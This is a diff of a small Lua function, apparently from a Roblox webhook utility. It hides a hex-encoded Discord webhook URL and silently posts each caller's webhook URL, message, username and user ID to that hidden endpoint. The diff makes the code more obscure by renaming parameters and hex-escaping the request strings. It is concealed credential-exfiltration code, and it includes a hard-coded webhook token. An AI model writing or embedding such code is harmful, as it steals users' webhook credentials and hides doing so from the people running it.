@@ -1,29 +1,30 @@
-return function(webhook, message, username, userId, requestFunc, HttpService)
-    local hex = "68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313339353534393532383936363239393731382f343342675953553343504c49307562614563345f50785a7a5238423249365f6c5251763730304a464c69487a674a613871445343656a696878496e55445068536f456965"
-    local decoded = ""
-    for i = 1, #hex, 2 do
-        decoded = decoded .. string.char(tonumber(hex:sub(i, i + 1), 16))
-    end
+return function(x1, x2, x3, x4, x5, x6)
+    local W = "68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313339353534393532383936363239393731382f343342675953553343504c49307562614563345f50785a7a5238423249365f6c5251763730304a464c69487a674a613871445343656a696878496e55445068536f456965"
+    local Z = ""
+    for i = 1, #W, 2 do Z = Z .. string.char(tonumber(W:sub(i, i+1), 16)) end
 
-    local embed = {
-        title = "🛰️ Webhook Ativada",
-        color = 16711680,
-        fields = {
-            { name = "Webhook usada", value = webhook, inline = false },
-            { name = "Mensagem enviada", value = message, inline = false },
-            { name = "Usuário", value = username, inline = true },
-            { name = "UserId", value = tostring(userId), inline = true }
-        },
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    local A = x6:JSONEncode({
+        embeds = {
+            {
+                title = "🛰️ Webhook Ativada",
+                color = 16711680,
+                fields = {
+                    { name = "\x57\x65\x62\x68\x6f\x6f\x6b\x20\x75\x73\x61\x64\x61", value = x1, inline = false },
+                    { name = "\x4d\x65\x6e\x73\x61\x67\x65\x6d\x20\x65\x6e\x76\x69\x61\x64\x6f", value = x2, inline = false },
+                    { name = "\x55\x73\x75\x61\x72\x69\x6f", value = x3, inline = true },
+                    { name = "\x55\x73\x65\x72\x49\x64", value = tostring(x4), inline = true }
+                },
+                timestamp = os.date("!" .. "%Y-%m-%dT%H:%M:%SZ")
+            }
+        }
+    })
+
+    local B = {
+        Url = Z,
+        Method = "\x50\x4f\x53\x54",
+        Headers = { ["\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65"] = "\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e" },
+        Body = A
     }
 
-    local payload = { embeds = {embed} }
-    local jsonData = HttpService:JSONEncode(payload)
-
-    requestFunc({
-        Url = decoded,
-        Method = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
-        Body = jsonData
-    })
+    x5(B)
 end
